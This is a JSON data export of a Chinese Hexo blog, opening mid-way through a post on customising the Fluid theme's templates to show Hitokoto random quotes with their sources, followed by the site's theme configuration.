class=\"hljs-string\">'」&lt;/span&gt;'</span></code></pre></p>\n<p>关于出处一开始是用两个函数调用去输出然后发现很乱，一个句子和出处一起输出又不知道怎么实现出处右对齐<del>学艺不精,等等我本来就不是专精这个的→_→。</del>于是就通过一些css调整使形式相对更美观一些。<br>修改后的<code>type.ejs</code>如下</p>\n<pre><code class=\"hljs undefined\"><span class=\"xml\">\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> <span class=\"hljs-keyword\">if</span>(theme.fun_features.typing.enable &amp;&amp; page.subtitle !== <span class=\"hljs-literal\">false</span>)&#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%-</span></span></span><span class=\"ruby\"> js_ex(theme.static_prefix.typed, <span class=\"hljs-string\">\"/typed.min.js\"</span>) </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"actionscript\">\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">typing</span><span class=\"hljs-params\">(id, hitokoto)</span></span>&#123;\n      <span class=\"hljs-keyword\">var</span> typed = <span class=\"hljs-keyword\">new</span> Typed(<span class=\"hljs-string\">'#'</span> + id, &#123;\n        strings: [\n          <span class=\"hljs-string\">'  '</span>,\n          hitokoto + <span class=\"hljs-string\">\"&amp;nbsp;\"</span>,\n        ],\n        cursorChar: <span class=\"hljs-string\">\"&lt;%-</span></span></span><span class=\"ruby\"> theme.fun_features.typing.cursorChar </span><span class=\"xml\"><span class=\"undefined\">%&gt;\",\n        typeSpeed: &lt;%-</span></span><span class=\"ruby\"> theme.fun_features.typing.typeSpeed </span><span class=\"xml\"><span class=\"undefined\">%&gt;,\n        loop: &lt;%-</span></span><span class=\"ruby\"> theme.fun_features.typing.loop </span><span class=\"xml\"><span class=\"javascript\">%&gt;,\n      &#125;);\n      typed.stop();\n      $(<span class=\"hljs-built_in\">document</span>).ready(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>&#123;\n        $(<span class=\"hljs-string\">\".typed-cursor\"</span>).addClass(<span class=\"hljs-string\">\"h2\"</span>);\n        typed.start();\n      &#125;);\n    &#125;;\n      \n  <span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span></span></span><span class=\"ruby\"> <span class=\"hljs-keyword\">if</span>(is_post()) &#123; </span><span class=\"xml\"><span class=\"actionscript\">%&gt;\n    typing(<span class=\"hljs-string\">\"subtitle\"</span>, <span class=\"hljs-string\">\"&lt;%-</span></span></span><span class=\"ruby\"> data.subtitle </span><span class=\"xml\"><span class=\"undefined\">%&gt;\")\n  &lt;%</span></span><span class=\"ruby\"> &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(theme.index.hitokoto.enable &amp;&amp; page.layout!==<span class=\"hljs-string\">'about'</span> &amp;&amp; page.layout!==<span class=\"hljs-string\">'links'</span> &amp;&amp; page.layout!==<span class=\"hljs-string\">'archive'</span> &amp;&amp; page.layout!==<span class=\"hljs-string\">'tags'</span>) &#123; </span><span class=\"xml\"><span class=\"javascript\">%&gt;\n    fetch(<span class=\"hljs-string\">'https://v1.hitokoto.cn'</span>)\n    .then(<span class=\"hljs-function\"><span class=\"hljs-params\">response</span> =&gt;</span> response.json())\n    .then(<span class=\"hljs-function\"><span class=\"hljs-params\">data</span> =&gt;</span> &#123;\n       typing(<span class=\"hljs-string\">\"hitokoto\"</span>, (data.hitokoto + <span class=\"hljs-string\">'&lt;br&gt;&lt;br&gt;&lt;span class=\"from\" id=\"from\"&gt;'</span> + <span class=\"hljs-string\">' ——「'</span> +data.from + <span class=\"hljs-string\">'」&lt;/span&gt;'</span>))\n    &#125;)\n    .catch(<span class=\"hljs-built_in\">console</span>.error)\n    &lt;%</span></span><span class=\"ruby\"> &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(page.layout!== <span class=\"hljs-string\">''</span> ) &#123; </span><span class=\"xml\"><span class=\"actionscript\">%&gt;\n        typing(<span class=\"hljs-string\">\"subtitle\"</span>, <span class=\"hljs-string\">\"&lt;%-</span></span></span><span class=\"ruby\"> data.subtitle </span><span class=\"xml\"><span class=\"undefined\">%&gt;\")\n    &lt;%</span></span><span class=\"ruby\"> &#125; </span><span class=\"xml\"><span class=\"undefined\">%&gt;\n  </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span></span></code></pre>\n<h4 id=\"修改layout-ejs\"><a href=\"#修改layout-ejs\" class=\"headerlink\" title=\"修改layout.ejs\"></a>修改layout.ejs</h4><p><code>layout.ejs</code>则和博客教程的那样即可<br><pre><code class=\"hljs undefined\"><span class=\"xml\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"h2\"</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"subtitle\"</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> <span class=\"hljs-keyword\">if</span>(theme.fun_features.typing.enable == <span class=\"hljs-literal\">false</span>) &#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%-</span></span></span><span class=\"ruby\"> subtitle </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> <span class=\"hljs-keyword\">if</span>(!is_post()) &#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"h2\"</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"subtitle\"</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> <span class=\"hljs-keyword\">if</span>(theme.fun_features.typing.enable == <span class=\"hljs-literal\">false</span>) &#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%-</span></span></span><span class=\"ruby\"> hitokoto </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> <span class=\"hljs-keyword\">if</span>(is_post() &amp;&amp; page.meta !== <span class=\"hljs-literal\">false</span>) &#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%-</span></span></span><span class=\"ruby\"> partial(<span class=\"hljs-string\">'_partial/post-meta'</span>) </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span></code></pre></p>\n<p>成品如下，还有在博客下方评论框实现的。<del>为什么刷不到那句话。</del><br><img src=\"/img/2020-09-21/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"></p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>所以说爱恨真是奇怪的东西，有的早早腐烂入土，有的刻骨。 ——「全球高考」<br>","more":"</p>\n<h4 id=\"启发\"><a href=\"#启发\" class=\"headerlink\" title=\"启发\"></a>启发</h4><p>不知不觉博客换了yilia、next、fluid三个主题了，三个主题都用了挺长时间。偶然间看到别人发的博客主页有句很好看的句子，自己也想搞一个来于是就动手搞一搞……<br><img src=\"/img/2020-09-21/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br>对于我这种主页不知道哔哔什么废话的再适合不过了。然鹅那个博客刷新的时候并没有发起特殊的请求，不过还好后来在同事的博客找到获取一句话的网络请求<del>，后来发现这个叫一言而且很多博客也有在用，孤陋寡闻了[捂脸]</del><br><img src=\"/img/2020-09-21/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>首先fluid_config.yml中首页的一句话是在index下的slogan中的text设置，顺便添加<code>hitokoto</code>参数，方便开启和关闭一言。<br><pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">index:</span>\n<span class=\"hljs-attr\">  banner_img:</span> <span class=\"hljs-string\">/img/default.jpg</span>  <span class=\"hljs-comment\"># 首页 Banner 头图，以下相同</span>\n<span class=\"hljs-attr\">  banner_img_height:</span> <span class=\"hljs-number\">100</span>  <span class=\"hljs-comment\"># 头图高度，屏幕百分比，available: 0 - 100</span>\n<span class=\"hljs-attr\">  banner_mask_alpha:</span> <span class=\"hljs-number\">0.3</span>  <span class=\"hljs-comment\"># 头图黑色蒙版的透明度，available: 0 - 1.0， 0 是完全透明（无蒙版），1 是完全不透明</span>\n<span class=\"hljs-attr\">  post_default_img:</span> <span class=\"hljs-string\">''</span> <span class=\"hljs-comment\"># 默认的文章封面图，当没有指定 index_img 时会使用该图片，若都为空则不显示任何图片</span>\n<span class=\"hljs-attr\">  slogan:</span>  <span class=\"hljs-comment\"># 首页副标题的独立设置</span>\n<span class=\"hljs-attr\">    enable:</span> <span class=\"hljs-literal\">true</span>  <span class=\"hljs-comment\"># 为 false 则不显示任何内容</span>\n<span class=\"hljs-attr\">    text:</span> <span class=\"hljs-string\">''</span>\n<span class=\"hljs-attr\">  hitokoto:</span>\n<span class=\"hljs-attr\">    enable:</span> <span class=\"hljs-literal\">true</span> <span class=\"hljs-comment\"># 开启hitokoto优先显示hitokoto</span>\n<span class=\"hljs-attr\">  auto_excerpt:</span>\n<span class=\"hljs-attr\">    enable:</span> <span class=\"hljs-literal\">true</span>\n<span class=\"hljs-attr\">  post_url_target:</span> <span class=\"hljs-string\">_self</span>  <span class=\"hljs-comment\"># available: _blank | _self</span>\n<span class=\"hljs-attr\">  post_meta:</span> <span class=\"hljs-comment\"># 是否显示文章信息（时间、分类、标签）</span>\n<span class=\"hljs-attr\">    date:</span> <span class=\"hljs-literal\">true</span>\n<span class=\"hljs-attr\">    category:</span> <span class=\"hljs-literal\">true</span>\n<span class=\"hljs-attr\">    tag:</span> <span class=\"hljs-literal\">true</span>\n<span class=\"hljs-string\">...</span></code></pre></p>\n<p><code>text</code>参数会传到<code>fluid/layout/index.ejs</code><br><img src=\"/img/2020-09-21/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>最开始是想在这里更改为一言的一句话，在最上面可以通过插入<code>&lt;script&gt;</code>标签,然后使用ajax执行Get请求就可以获得一言的句子，但是此方法获取到的值只能在<code>&lt;script&gt;</code>内使用，不能赋值到ejs中<del>我也不会也没查到</del><strong>遂卒</strong><br>后来百度查到<code>hitokoto</code>有官方调用的文档–&gt;<a href=\"https://hitokoto.cn/\" target=\"_blank\" rel=\"noopener\">传送门</a><br>也查到一个fluid主题添加一言的教程给了很多帮助–&gt;<a href=\"https://pxxyyz.com/posts/30454/\" target=\"_blank\" rel=\"noopener\">传送门</a>，<del>然而那个人的博客主页并没有设置成功/doge</del>，还有这篇–&gt;<a href=\"https://blog.bill.moe/add-hitokoto/\" target=\"_blank\" rel=\"noopener\">传送门</a><br>根据博客里讲的，修改的地方位于<code>layout\\_partial\\plugins\\typed.ejs</code>，仔细想想也没错，修改<code>index.ejs</code>可以直接显示一言不用管其他文件但是实现起来有点困难，<code>typed.ejs</code>是打字机的js控制程序，通过修改<code>typed.ejs</code>实现index页面打印一言，其余页面该打印什么打印什么，只要加个if条件判断是index页面还是其他页面。</p>\n<h4 id=\"修改typed-ejs\"><a href=\"#修改typed-ejs\" class=\"headerlink\" title=\"修改typed.ejs\"></a>修改typed.ejs</h4><p>首先原始的<code>typed.ejs</code>主要分为2部分，第一部分是打字机调用程序，第二部分是接口<br><img src=\"/img/2020-09-21/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br>首先把打字机调用程序改成<code>function</code>形式，通过调用<code>typing</code>函数来输出，需要传入的参数有id和hitokoto(subtitle)，在原始的<code>typed.ejs</code>中通过<code>&lt;%- data.subtitle %&gt;</code>形式来传参，改成函数的时候要改为<code>hitokoto</code>，同时在<code>typed.ejs</code>中的<code>#subtitle</code>是输出点<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">var</span> typed = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-type\">Typed</span>(<span class=\"hljs-string\">'#subtitle'</span>, &#123;</code></pre></p>\n<p>对应到layout.ejs中的如下位置，通过id来确定输出点<del>后来发现改了&lt;%- hitokoto %&gt;这个也可以，装死</del><br><img src=\"/img/2020-09-21/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>如果控制台出现如下异常则是因为<code>typed.ejs</code>中#后面的参数和<code>layout.ejs</code>的输出点的id不一样导致打字机找不到输出点报的异常。<br><pre><code class=\"hljs undefined\">TypeError: Cannot <span class=\"hljs-keyword\">read</span> <span class=\"hljs-keyword\">property</span><span class=\"hljs-title\"> </span>'tagName' of null</code></pre></p>\n<p>因为我的目标只需要修改index页面的打字机而其他页面还是原来的样子，一旦修改了<code>#subtitle</code>就会触发报错，当然也可以不修改，因为我一开始没搞懂就改了，就懒得改回去了。封装好typing函数之后<code>typing(&quot;subtitle&quot;, &quot;&lt;%- data.subtitle %&gt;&quot;)</code>就可以调用，达到原来的样子根据参考的博客教程添加<code>&lt;% if(is_post()) { %&gt;</code>条件可以过让文章打印原始的subtitle，也就是对应着文章的标题，但是还不行，在其他归档、标签、关于等页面还是会显示一言。打开<code>about.ejs</code>和<code>page.ejs</code>对比会发现固定页面<code>page.layout</code>则是背设为固定，<code>page.ejs</code>则不是<br><pre><code class=\"hljs undefined\"><span class=\"hljs-comment\">//about.ejs</span>\npage<span class=\"hljs-selector-class\">.layout</span> = <span class=\"hljs-string\">\"about\"</span>\n\n<span class=\"hljs-comment\">//page.ejs</span>\n<span class=\"hljs-selector-tag\">var</span> layout = page.layout</code></pre></p>\n<p>因此用<code>&amp;&amp; page.layout!==&#39;about&#39; &amp;&amp; page.layout!==&#39;links&#39; &amp;&amp; page.layout!==&#39;archive&#39; &amp;&amp; page.layout!==&#39;tags&#39;</code>可以排除掉不想展示的页面。(如果你想要所有页面设为一言就去掉即可)。按照博客教程是只显示一句话，没有出处。对于引用别人的东西我喜欢加上出处<br><pre><code class=\"hljs undefined\">data<span class=\"hljs-selector-class\">.hitokoto</span> + <span class=\"hljs-string\">'&lt;br&gt;&lt;br&gt;&lt;span class=\"from\" id=\"from\"&gt;'</span> + <span class=\"hljs-string\">' ——「'</span> +data<span class=\"hljs-selector-class\">.from</span> + <span class=\"hljs-string\">'」&lt;/span&gt;'</span></code></pre></p>\n<p>关于出处一开始是用两个函数调用去输出然后发现很乱，一个句子和出处一起输出又不知道怎么实现出处右对齐<del>学艺不精,等等我本来就不是专精这个的→_→。</del>于是就通过一些css调整使形式相对更美观一些。<br>修改后的<code>type.ejs</code>如下</p>\n<pre><code class=\"hljs undefined\"><span class=\"xml\">\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> <span class=\"hljs-keyword\">if</span>(theme.fun_features.typing.enable &amp;&amp; page.subtitle !== <span class=\"hljs-literal\">false</span>)&#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%-</span></span></span><span class=\"ruby\"> js_ex(theme.static_prefix.typed, <span class=\"hljs-string\">\"/typed.min.js\"</span>) </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"actionscript\">\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">typing</span><span class=\"hljs-params\">(id, hitokoto)</span></span>&#123;\n      <span class=\"hljs-keyword\">var</span> typed = <span class=\"hljs-keyword\">new</span> Typed(<span class=\"hljs-string\">'#'</span> + id, &#123;\n        strings: [\n          <span class=\"hljs-string\">'  '</span>,\n          hitokoto + <span class=\"hljs-string\">\"&amp;nbsp;\"</span>,\n        ],\n        cursorChar: <span class=\"hljs-string\">\"&lt;%-</span></span></span><span class=\"ruby\"> theme.fun_features.typing.cursorChar </span><span class=\"xml\"><span class=\"undefined\">%&gt;\",\n        typeSpeed: &lt;%-</span></span><span class=\"ruby\"> theme.fun_features.typing.typeSpeed </span><span class=\"xml\"><span class=\"undefined\">%&gt;,\n        loop: &lt;%-</span></span><span class=\"ruby\"> theme.fun_features.typing.loop </span><span class=\"xml\"><span class=\"javascript\">%&gt;,\n      &#125;);\n      typed.stop();\n      $(<span class=\"hljs-built_in\">document</span>).ready(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>&#123;\n        $(<span class=\"hljs-string\">\".typed-cursor\"</span>).addClass(<span class=\"hljs-string\">\"h2\"</span>);\n        typed.start();\n      &#125;);\n    &#125;;\n      \n  <span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span></span></span><span class=\"ruby\"> <span class=\"hljs-keyword\">if</span>(is_post()) &#123; </span><span class=\"xml\"><span class=\"actionscript\">%&gt;\n    typing(<span class=\"hljs-string\">\"subtitle\"</span>, <span class=\"hljs-string\">\"&lt;%-</span></span></span><span class=\"ruby\"> data.subtitle </span><span class=\"xml\"><span class=\"undefined\">%&gt;\")\n  &lt;%</span></span><span class=\"ruby\"> &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(theme.index.hitokoto.enable &amp;&amp; page.layout!==<span class=\"hljs-string\">'about'</span> &amp;&amp; page.layout!==<span class=\"hljs-string\">'links'</span> &amp;&amp; page.layout!==<span class=\"hljs-string\">'archive'</span> &amp;&amp; page.layout!==<span class=\"hljs-string\">'tags'</span>) &#123; </span><span class=\"xml\"><span class=\"javascript\">%&gt;\n    fetch(<span class=\"hljs-string\">'https://v1.hitokoto.cn'</span>)\n    .then(<span class=\"hljs-function\"><span class=\"hljs-params\">response</span> =&gt;</span> response.json())\n    .then(<span class=\"hljs-function\"><span class=\"hljs-params\">data</span> =&gt;</span> &#123;\n       typing(<span class=\"hljs-string\">\"hitokoto\"</span>, (data.hitokoto + <span class=\"hljs-string\">'&lt;br&gt;&lt;br&gt;&lt;span class=\"from\" id=\"from\"&gt;'</span> + <span class=\"hljs-string\">' ——「'</span> +data.from + <span class=\"hljs-string\">'」&lt;/span&gt;'</span>))\n    &#125;)\n    .catch(<span class=\"hljs-built_in\">console</span>.error)\n    &lt;%</span></span><span class=\"ruby\"> &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(page.layout!== <span class=\"hljs-string\">''</span> ) &#123; </span><span class=\"xml\"><span class=\"actionscript\">%&gt;\n        typing(<span class=\"hljs-string\">\"subtitle\"</span>, <span class=\"hljs-string\">\"&lt;%-</span></span></span><span class=\"ruby\"> data.subtitle </span><span class=\"xml\"><span class=\"undefined\">%&gt;\")\n    &lt;%</span></span><span class=\"ruby\"> &#125; </span><span class=\"xml\"><span class=\"undefined\">%&gt;\n  </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span></span></code></pre>\n<h4 id=\"修改layout-ejs\"><a href=\"#修改layout-ejs\" class=\"headerlink\" title=\"修改layout.ejs\"></a>修改layout.ejs</h4><p><code>layout.ejs</code>则和博客教程的那样即可<br><pre><code class=\"hljs undefined\"><span class=\"xml\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"h2\"</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"subtitle\"</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> <span class=\"hljs-keyword\">if</span>(theme.fun_features.typing.enable == <span class=\"hljs-literal\">false</span>) &#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%-</span></span></span><span class=\"ruby\"> subtitle </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> &#125; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">%</span></span></span><span class=\"ruby\"> <span class=\"hljs-keyword\">if</span>(!is_post()) &#123; </span><span class=\"xml\"><span class=\"hljs-tag\">%&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"h2\"</span> <span class=\"hljs-attr\">id</span>=<span 